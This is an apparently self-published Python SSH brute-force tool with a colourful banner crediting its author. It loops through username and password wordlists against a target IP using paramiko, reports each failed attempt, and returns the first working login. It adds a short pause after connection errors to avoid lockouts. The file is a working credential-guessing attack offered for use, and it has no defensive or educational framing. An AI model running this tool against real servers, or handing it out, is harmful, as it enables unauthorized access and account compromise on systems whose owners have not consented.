import paramiko
import time
import argparse

print("""\033[96m

###################sreeraj#############################sreeraj#####################################################
########sreeraj#####################sreeraj###################################################sreeraj##############
################sreeraj###############################sreeraj######################################################


   _____    _____   _    _   ____                   _              _______                   _ 
  / ____|  / ____| | |  | | |  _ \                 | |            |__   __|                 | |
 | (___   | (___   | |__| | | |_) |  _ __   _   _  | |_    ___       | |      ___     ___   | |
  \___ \   \___ \  |  __  | |  _ <  | '__| | | | | | __|  / _ \      | |     / _ \   / _ \  | |
  ____) |  ____) | | |  | | | |_) | | |    | |_| | | |_  |  __/      | |    | (_) | | (_) | | |
 |_____/  |_____/  |_|  |_| |____/  |_|     \__,_|  \__|  \___|      |_|     \___/   \___/  |_|
                                                                                               
                                                                                               

######################sreeraj#######################################sreeraj#######################################
##########sreeraj######################sreeraj############################################sreeraj#################
######################sreeraj#############################sreeraj#################################################\033[0m

\n
\033[92m
**********************************************************************
\n
* copyright of Sreeraj,2024                                          *\n
\n
* www.youtube.com/@debugspecter                                      *\n
\n
* https://github.com/s-r-e-e-r-a-j                                   *\n
**********************************************************************
\n

   \033[0m""")
print("\n");








def ssh_bruteforce(target_ip, username_wordlist, password_wordlist):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Open the username and password wordlists
    with open(username_wordlist, 'r') as ufile, open(password_wordlist, 'r') as pfile:
        usernames = ufile.readlines()
        passwords = pfile.readlines()

    # Iterate over all username and password combinations
    for username in usernames:
        username = username.strip()
        for password in passwords:
            password = password.strip()
            print(f"\033[94mTrying username: {username}, password: {password}\033[0m")

            try:
                client.connect(target_ip, username=username, password=password, timeout=1)
                print(f"\033[93mSuccess! Username: {username}, Password: {password}\033[0m")
                return username, password
            except paramiko.AuthenticationException:
                print("\033[31mIncorrect credentials.\033[0m")
            except paramiko.SSHException as e:
                print(f"\033[31mConnection error: {e}\033[0m")
                time.sleep(1)  # Pause to avoid lockouts on too many attempts
            finally:
                client.close()

    print("\033[93mNo valid username/password combination found in the wordlists.\033[0m")
    return None

def main():
    parser = argparse.ArgumentParser(description="SSH Brute-Forcing Tool with Username and Password Wordlists")
    parser.add_argument("target_ip", type=str, help="Target IP address of the SSH server")
    parser.add_argument("username_wordlist", type=str, help="Path to the username wordlist file")
    parser.add_argument("password_wordlist", type=str, help="Path to the password wordlist file")
    
    args = parser.parse_args()

    ssh_bruteforce(args.target_ip, args.username_wordlist, args.password_wordlist)

if __name__ == "__main__":
    main()
